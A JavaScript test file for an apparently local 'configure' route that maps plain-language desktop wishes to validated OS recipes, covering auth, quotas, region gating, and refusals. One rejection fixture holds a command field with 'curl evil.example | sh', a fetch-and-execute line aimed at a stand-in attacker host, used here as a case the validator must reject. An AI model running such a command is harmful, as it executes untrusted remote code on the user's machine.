import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import test from "node:test";

import {
  BASES,
  BASE_IDS,
  CONFIGURE_CAPABILITY,
  ConfigureOutputError,
  LOOK_IDS,
  THEME_IDS,
  analyzeConfigureRequest,
  obviousUnsupported,
  planFromSelection,
} from "../src/configure.js";
import { makeApp, register } from "./helpers.js";

const repo = fileURLToPath(new URL("../..", import.meta.url));
const python = (args, input) => JSON.parse(execFileSync("python3", ["-m", "src.customize.recipe", ...args], { cwd: repo, input, encoding: "utf8" }));

test("cloud catalogue is held to the authoritative recipe compiler and schema", () => {
  const catalogue = python(["catalogue"]);
  assert.deepEqual(BASE_IDS, catalogue.bases.map((x) => x.id).sort());
  assert.deepEqual(LOOK_IDS, catalogue.looks.map((x) => x.id).sort());
  assert.deepEqual(THEME_IDS, catalogue.themes.map((x) => x.id).sort());
  for (const base of catalogue.bases) {
    assert.deepEqual(BASES[base.id], {
      look: base.default_look,
      theme: base.default_theme,
      requires: base.delivery.requires,
    });
  }
});

test("a supported description becomes the same bounded recipe and resolution as the compiler", () => {
  const analysis = analyzeConfigureRequest("An older, slower computer with a familiar Windows-like bar and warm ember colours.");
  const plan = planFromSelection(analysis.expected);
  const compiled = python(["compile"], JSON.stringify(plan.recipe));
  assert.equal(plan.capability, CONFIGURE_CAPABILITY);
  assert.equal(plan.status, "validated-not-built");
  assert.deepEqual(plan.resolved_preferences, compiled.resolved_preferences);
  assert.deepEqual(plan.delivery.requires, compiled.delivery.requires);
  assert.deepEqual(plan.delivery, {
    state: "validated-not-built",
    artifact_created: false,
    download_ready: false,
    attestation: null,
    requires: compiled.delivery.requires,
  });
});

test("obvious custom behavior and hardware sensor requests are refused locally", () => {
  for (const [text, reason] of [
    ["Make the screen brighter whenever this computer points north", "hardware_sensor"],
    ["Use desktop with a taskbar and install Spotify", "programs"],
    ["Run a shell command every time I log in", "custom_behavior"],
  ]) {
    assert.equal(analyzeConfigureRequest(text).reason, reason, text);
  }
});

test("closed validation rejects executable fields, invented values, and kiosk look changes", () => {
  const bad = [
    { base: "desktop", look: "default", theme: "default", command: "curl evil.example | sh" },
    { base: "invented-base", look: "default", theme: "default" },
    { base: "school-kiosk", look: "taskbar", theme: "default" },
  ];
  for (const value of bad) assert.throws(() => planFromSelection(value), ConfigureOutputError);
});

test("mixed supported and unsupported request stays unsupported", () => {
  assert.equal(analyzeConfigureRequest("Use the Revive base in moss and also make the pointer enormous").reason, "other");
});

test("bare Office is not mistaken for the office computer base", () => {
  assert.equal(analyzeConfigureRequest("Give me Office").reason, "other");
  assert.deepEqual(analyzeConfigureRequest("Use the office computer base").expected,
    { base: "office", look: "default", theme: "default" });
});

test("configure route authenticates and honors the budget switch before reading or planning", async () => {
  const on = makeApp();
  assert.equal((await on.call("/v1/configure/plan", null, { raw: "not-json" })).status, 401);
  assert.equal(on.calls.length, 0);

  const off = makeApp({ env: { DAILY_BUDGET_USD: "0" } });
  const { token } = await register(off);
  const r = await off.call("/v1/configure/plan", null, { token, raw: "not-json" });
  assert.equal(r.status, 503);
  assert.equal(off.calls.length, 0);
  assert.equal((await r.json()).text, "Wishes are resting for a little while");
});

test("configure route enforces body and request limits before planning", async () => {
  const app = makeApp();
  const { token } = await register(app);
  let r = await app.call("/v1/configure/plan", { text: "x".repeat(301) }, { token });
  assert.equal(r.status, 400);
  assert.equal((await r.json()).error, "too_long");
  r = await app.call("/v1/configure/plan", { text: "desktop", extra: true }, { token });
  assert.equal(r.status, 400);
  r = await app.call("/v1/configure/plan", null, { token, raw: `{"text":"${"x".repeat(9000)}"}` });
  assert.equal(r.status, 400);
  assert.equal(app.calls.length, 0);
});

test("configure route returns a plan locally and never invokes the injected model", async () => {
  const app = makeApp({ respond: () => { throw new Error("must not call model"); } });
  const { token } = await register(app);
  const words = "An everyday computer laid out like a Mac, in moss colours";
  const r = await app.call("/v1/configure/plan", { text: words }, { token });
  assert.equal(r.status, 200);
  const plan = await r.json();
  assert.deepEqual(plan.recipe, { schema: "org.auros.recipe", version: 1, base: "desktop", preferences: { look: "dock", theme: "moss" } });
  assert.equal(plan.status, "validated-not-built");
  assert.equal(plan.delivery.artifact_created, false);
  assert.equal(plan.delivery.download_ready, false);
  assert.equal(plan.delivery.attestation, null);
  assert.equal(app.calls.length, 0);
  assert.equal(app.logs.join("\n").includes(words), false);
});

test("configure route rejects mixed requests without calling the model or returning a recipe", async () => {
  const app = makeApp({ respond: () => { throw new Error("must not call model"); } });
  const { token } = await register(app);
  const r = await app.call("/v1/configure/plan", { text: "Use Revive with a taskbar and install Spotify" }, { token });
  assert.equal(r.status, 422);
  const body = await r.json();
  assert.equal(body.status, "unsupported");
  assert.equal(body.reason, "programs");
  assert.equal("recipe" in body, false);
  assert.equal(app.calls.length, 0);
});

test("local refusals still require a live token and consume the configure quota", async () => {
  const forgotten = makeApp();
  const { token } = await register(forgotten);
  assert.equal((await forgotten.call("/v1/forget", {}, { token })).status, 204);
  assert.equal((await forgotten.call("/v1/configure/plan", { text: "install an app" }, { token })).status, 401);

  const limited = makeApp();
  const registered = await register(limited);
  for (let i = 0; i < 3; i++) assert.equal((await limited.call("/v1/configure/plan", { text: "install an app" }, { token: registered.token })).status, 422);
  assert.equal((await limited.call("/v1/configure/plan", { text: "install an app" }, { token: registered.token })).status, 429);
  assert.equal(limited.calls.length, 0);
});

test("configure has its own per-token quota and region gate", async () => {
  const app = makeApp({ respond: () => { throw new Error("must not call model"); } });
  const { token } = await register(app);
  for (let i = 0; i < 3; i++) assert.equal((await app.call("/v1/configure/plan", { text: "ordinary desktop" }, { token })).status, 200);
  assert.equal((await app.call("/v1/configure/plan", { text: "ordinary desktop again" }, { token })).status, 429);

  const elsewhere = makeApp({ respond: () => { throw new Error("must not call model"); } });
  const reg = await register(elsewhere);
  const r = await elsewhere.call("/v1/configure/plan", { text: "ordinary desktop" }, { token: reg.token, country: "GB" });
  assert.equal(r.status, 403);
  assert.equal(elsewhere.calls.length, 0);
});

test("configure does not broaden the existing health claim", async () => {
  const on = await makeApp().call("/v1/health", null, { method: "GET" });
  assert.deepEqual(await on.json(), { ok: true, wishes: "on" });
  const off = await makeApp({ env: { DAILY_BUDGET_USD: "0" } }).call("/v1/health", null, { method: "GET" });
  assert.deepEqual(await off.json(), { ok: true, wishes: "resting" });
});

test("direct plan construction keeps defaults and restrictive policy exact", () => {
  assert.deepEqual(planFromSelection({ base: "school-kiosk", look: "default", theme: "default" }).resolved_preferences, { look: "locked", theme: "sandstone" });
  assert.equal(obviousUnsupported("A plain desktop"), null);
  assert.deepEqual(analyzeConfigureRequest("An everyday computer laid out like a Mac, in moss colours").expected,
    { base: "desktop", look: "dock", theme: "moss" });
});
